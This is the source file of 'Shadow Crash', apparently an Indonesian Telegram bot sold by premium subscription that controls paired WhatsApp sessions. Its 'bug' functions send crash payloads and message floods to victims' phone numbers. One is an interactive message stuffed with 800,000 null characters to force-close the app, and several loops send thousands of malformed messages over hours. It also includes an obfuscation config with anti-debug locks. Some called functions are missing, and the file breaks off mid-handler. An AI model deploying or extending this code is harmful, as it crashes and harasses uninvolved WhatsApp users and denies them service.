const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk"); 
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));



const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/jbrfourtyexten-creator/Piz/refs/heads/main/tokens.json"; 

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid."));
    process.exit(1);
  }

  console.log(chalk.green(` Depisz⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`anda masuk ke akses Shadow Crash 
`));


console.log(chalk.bold.blue(`
═════════════════════════
 Shadow Crash 
 
                 .          .           .          .
         .            .            .            .            .
  .            .            _--_            .            .
        .           _---_--=____=--_---_           .
    .          _--==_  _--====--_  _==--_          .
  __________--==__   -==========-   __==--__________
  \________________________________________________/
     \  o  o  o  o  o  o  o  o  o  o  o  o  o  o  /
      \__________________________________________/
      .      /        /      |      \        \      .
            /        /       |       \        \
           /        /        |        \        \
          /        /         |         \        \
         /        /          |          \        \
        *        *           *           *        *

                 .           _           .
                          _-( )-_
               .      _--== ( ) ==--_      .
                   _-==  _--   --_  ==-_
                  <=== _--   *   --_ ===>
                   -==_  --_   _--  _==-
               .      --==_ ( ) _==--      .
                          -=( )=-
                 .           -           .
                 
    Thanks To
    
  Developer : @Depisz                           
  Support : @jbrfourty
  
       SHADOW CRASH                         
           
═════════════════════════
`));

console.log(chalk.blue(`
------ (  𝚂𝚄𝙲𝙲𝙴𝚂𝚂 ke daftar ) ------
`));
};

validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙴𝚁𝚁𝙾𝚁 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝚂𝚞𝚔𝚜𝚎𝚜 ${botNumber}..... 𝚋𝚊𝚗𝚐\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶\`\`\`
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`𝙶𝙰𝙶𝙰𝙻 𝙰𝙽𝙹𝙸𝚁  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}





// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/h3agum.mp4"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /cdmurbug 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `和Ganteng无Sangat气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© Shadow Crash_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}

const venomModsData = JSON.stringify({
  status: true,
  criador: "Vampire",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 80000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 2000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 6000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});



// ---------( The Bug Function)----------

async function NewlesterForceClose(target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "⟅̊༑ ▾𝐀͜𝐒͡𝐓͢𝐑͜𝐎͡𝐓͢𝐇🦠𝐗͜-𝐑͡𝐀͢𝐘⟅̊༑ ▾"
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "review_order",
                            buttonParamsJson: "\u0000".repeat(800000)
                        }]
                    }
                }
            }
        }
    }, {}, {
        messageId: null
    });
    console.log(chalk.yellow('BUG NEWLESTER TERIRIM'))
}
async function turudek(target) {
    for (let i = 0; i < 10; i++) {
        await EpeLocSpam(target);
        await NewlesterForceClose(target);
        await sleep(1000);
    }
}


async function delayonly(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 8000) {
            await Promise.all([
            WaApi(target, false),
            WaApi(target, false), 
            WaApi(target, false),
            WaApi(target, false), 
            ]);
            console.log(chalk.red(`VXEP INVASION) (DELAY) ${count}/8000 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 8000 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 8000 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
async function yapit(target) {
    for (let i = 0; i < 10; i++) {
        await EpeLocSpam(target);
        await delayonly(target);
        await sleep(1000);
    }
}


async function forcexata(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 800) {
            await Promise.all([
            VampFcSpam(target, false),
            ]);
            console.log(chalk.red(`{VXEP}{FORCE} ${count}/800 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 400 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 400 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
async function sokasik(target) {
    for (let i = 0; i < 10; i++) {
        await EpeLocSpam(target);
        await forcexata(target);
        await sleep(1000);
    }
}

async function memek(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 8000) {
            await Promise.all([
            VampBroadcast(target, true),
            VampBroadcast(target, true), 
            protocolbug5(target, true),
            protocolbug5(target, true), 
            ]);
            console.log(chalk.red(`yapit) (DELAY) ${count}/8000 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 8000 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 8000 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}
async function death(target) {
    for (let i = 0; i < 10; i++) {
        await EpeLocSpam(target);
        await memek(target);
        await sleep(1000);
    }
}

// DEATH☠️ //

async function what(durationHours, target) { 
const totalDurationMs = durationHours * 60 * 60 * 1000;
const startTime = Date.now(); let count = 0;

const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
        console.log(`Stopped after sending ${count} messages`);
        return;
    }

    try {
        if (count < 8000) {
            await Promise.all([
            VampBroadcast(target, true),
            VampBroadcast(target, true), 
            protocolbug5(target, true),
            protocolbug5(target, true),
            WaApi(target, true),
            WaApi(target, true),
            sistemFc(target, true),
            sistemFc(target, true),
            VampFcSpam(target, true),
            VampFcSpam(target, true),
            ]);
            console.log(chalk.red(`DEATH) (MATIKAU☠️) ${count}/8000 to ${target}`));
            count++;
            setTimeout(sendNext, 100);
        } else {
            console.log(chalk.green(`✅ Success Sending 8000 Messages to ${target}`));
            count = 0;
            console.log(chalk.red("➡️ Next 8000 Messages"));
            setTimeout(sendNext, 100);
        }
    } catch (error) {
        console.error(`❌ Error saat mengirim: ${error.message}`);
        

        setTimeout(sendNext, 100);
    }
};

sendNext();

}


async function IosInvisible(target) {
for (let i = 0; i < 80; i++) {
await VampFcSpam(target)
await VampFcSpam(target)
await VampFcSpam(target)
await VampFcSpam(target)
await VampFcSpam(target)
}
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}


const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tidak ada username";
  const premiumStatus = getPremiumStatus(senderId);
  const runtime = getBotRuntime();
  const randomImage = getRandomImage();

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, randomImage, {
      caption: `\`\`\`SILAHKAN\`\`\`
KETIK /regis untuk add prem. 
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "info update", url: "https://t.me/Depisz" }]]
      }
    });
  }

  bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`
╭━━━( Shadow Crash )
║ DEVELOPER   : @Depisz
┃ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 1.0.0
┃ ᴜsᴇʀ : ${username}
┃ sᴛᴀᴛᴜs : ${premiumStatus}
║ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime}
┃ ᴜsᴇʀ ɪᴅ : ${senderId}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐎͢͡𝐰𝐧͢͠𝐞𝐫͢𝐌𝐞͜͠𝐧𝐮", callback_data: "setting" }, { text: "𝐓‌𝐇‌𝐀‌𝐍𝐊⍣𝛞𝐓‌𝐎‌‌𝐎", callback_data: "owner_menu" }],
        [{ text: "𝐁͢𝐮͠𝐠 ", callback_data: "trashmenu" }]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const randomImage = getRandomImage();

    let caption = "";
    let replyMarkup = {};

    if (query.data === "trashmenu") {
      caption = `\`\`\`
╭━━━𓊈 Shadow Crash 𓊉
║ DEVELOPER   : @Depisz
┃ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 1.0.0
┃ ᴜsᴇʀ : ${username}
┃ sᴛᴀᴛᴜs : ${premiumStatus}
║ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime}
┃ ᴜsᴇʀ ɪᴅ : ${senderId}    
╰━━━━━━━━━━━━━━━━━━⭓
┏━━[  𝗧𝗥𝗔𝗦𝗛 - 𝗠𝗘𝗡𝗨 ]
┃
┃✘ /tod 628xxx
┃     #button bug
┃
┃✘ /turudek 628xxx
┃     #force close
┃
┃✘ /sokasik 628xxx
┃     #Fc v2
┃
┃✘ /yapit 628xxx
┃     #delay bisa 1-3h jika tidak di matikan
┃
┃✘ /death 628xxx
┃     #jangan di salah gunakan   
┗━━━━━━━━━━━━━━━━━━━━❍
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }
    
    if (query.data === "setting") {
      caption = `\`\`\`
╭━━━𓊈 Shadow Crash 𓊉
║ DEVELOPER   : @Depisz
┃ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 1.0.0
┃ ᴜsᴇʀ : ${username}
┃ sᴛᴀᴛᴜs : ${premiumStatus}
║ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime}
┃ ᴜsᴇʀ ɪᴅ : ${senderId}
╰━━━━━━━━━━━━━━━━━━⭓
╭━( 𝙾𝚆𝙽𝙴𝚁 𝙼𝙴𝙽𝚄 )
┃▢ /cdmurbug 
┃▢ /deladmin
┃▢ /addadmin
┃▢ /addsender 
┃▢ /reqpair
┃▢ /regis
┃▢ /delsup
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "owner_menu") {
      caption = `\`\`\`
╭━━━( Shadow Crash )
║ DEVELOPER   : @Depisz
┃ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 1.0.0
┃ ᴜsᴇʀ : ${username}
┃ sᴛᴀᴛᴜs : ${premiumStatus}
║ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime}
┃ ᴜsᴇʀ ɪᴅ : ${senderId}
╰━━━━━━━━━━━━━━━━━━⭓

╔─═「 𝐓‌𝐇‌𝐀‌𝐍𝐊⍣𝛞𝐓‌𝐎‌‌𝐎 」
│ ┏─⊱
║ ▢ Depisz҈ (devoloper)
│ ▢ Jbr Fouty (developer 02)
│ ┗─⊱
╚─═─═─═─═─═─═─═⪩  
\`\`\``;
      replyMarkup = { inline_keyboard: [[{ text: "🔙 Kembali", callback_data: "back_to_main" }]] };
    }

    if (query.data === "back_to_main") {
      caption = `\`\`\`
╭━━━( Shadow Crash )
║ DEVELOPER   : @Depisz
┃ 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 1.0.0
┃ ᴜsᴇʀ : ${username}
┃ sᴛᴀᴛᴜs : ${premiumStatus}
║ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime}
┃ ᴜsᴇʀ ɪᴅ : ${senderId}
╰━━━━━━━━━━━━━━━━━━⭓


\`\`\``;
      replyMarkup = {
        inline_keyboard: [
        [{ text: "𝐎͢͡𝐰𝐧͢͠𝐞𝐫͢𝐌𝐞͜͠𝐧𝐮", callback_data: "setting" }, { text: "𝐓‌𝐇‌𝐀‌𝐍𝐊⍣𝛞𝐓‌𝐎‌‌𝐎", callback_data: "owner_menu" }],
        [{ text: "𝐁͢𝐮͠𝐠 ", callback_data: "trashmenu" }]
      ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: randomImage,
        caption: caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//
bot.onText(/\/tod (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);


  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/v8ttm4.mp4", {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Depisz" }]
      ]
    }
  });
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }
    
      if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  bugRequests[chatId] = { stage: "awaitingNumber", jid };

  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝚃𝚢𝚙𝚎 𝙱𝚞𝚐 𝚂𝚎𝚕𝚎𝚌𝚝", callback_data: `xlobug:${jid}` },
          { text: "𝙸𝚗𝚌𝚕𝚘𝚞𝚍𝚜 𝙳𝚎𝚕𝚊𝚢", callback_data: `vxcrash_proto:${jid}` }
        ],
        [
          { text: "𝙾𝚏 𝙶𝚘𝚘𝚍 𝙳𝚎𝚕𝚊𝚢", callback_data: `xlobug_ui:${jid}` },
          { text: "𝚃𝚛𝚊𝚜𝚑𝚎𝚛 𝙲𝚘𝚖𝚋𝚘𝚡", callback_data: `bloxus:${jid}` }
        ],
        [
          { text: "𝚃𝚑𝚎 𝚜𝚝𝚘𝚛𝚢 𝚕𝚘𝚟𝚎", callback_data: `vxblank:${jid}` },
          { text: "𝚁𝚊𝚒𝚗𝚋𝚘𝚠 𝚇", callback_data: `vxcrash:${jid}` }
        ],
        [
          { text: "𝚅𝚒𝚎𝚠 𝚜𝚝𝚘𝚛𝚢", callback_data: `vxcrash_protoview:${jid}` },
          { text: "𝚡 𝚜𝚞𝚙𝚎𝚛", callback_data: `vxcrash_super:${jid}` }
        ], 
        [
          { text: "𝚃𝚑𝚎 𝚇𝚝𝚑𝚞𝚗𝚍𝚎𝚛", callback_data: `bombug:${jid}` },
        ]
      ]
    }
  };

  bot.sendVideo(chatId, "https://files.catbox.moe/v8ttm4.mp4", { 
    caption: `
╭━━━━⟮ 𝙴𝙻𝙸𝙼𝙸𝙽𝙰𝚂𝙸 ⟯
┃▢ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━━━
`,
    parse_mode: "Markdown",
    ...options
  });
    } catch (error) {

    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);

  }

});   


bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const [action, jid] = callbackQuery.data.split(":");

  if (action.startsWith("vx")) {
  
    try {
      if (sessions.size === 0) {
        return bot.sendMessage(
          chatId,
